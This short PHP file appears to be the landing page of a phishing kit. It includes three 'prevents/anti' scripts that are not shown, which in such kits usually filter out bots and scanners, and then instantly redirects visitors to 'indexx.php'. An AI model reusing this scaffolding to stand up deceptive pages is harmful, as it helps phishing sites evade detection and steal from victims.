<?php

		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
$md5 = md5(uniqid(time()));
$loc="indexx.php";
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">
<script type="text/javascript">
loc = "<?php echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head>